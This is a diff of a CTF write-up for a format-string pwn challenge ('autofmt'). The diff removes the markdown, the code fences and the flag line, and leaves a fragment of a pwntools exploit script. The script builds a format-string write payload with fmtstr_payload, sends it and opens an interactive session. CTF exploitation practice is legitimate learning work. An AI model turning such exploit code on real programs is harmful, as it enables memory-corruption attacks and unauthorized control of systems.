@@ -1,10 +1,3 @@
-# **Auto Format String - PWN CTF Challenge**
-
-### ***Exploitation***
----
-
-
-```
 from pwn import *
 
 #p = process('./autofmt')
@@ -25,14 +18,4 @@ payload = fmtstr.fmtstr_payload(10, writes, write_size='short')
 
 p.sendline(payload)
 p.interactive()
-
-```
-
-![flag](images/flag.png)
-
-> **FLAG: Wanna.One{do_cac_ban_tren_the_gian_nay_khoang_cach_nao_la_xa_nhat}**
-
-
-
-
 
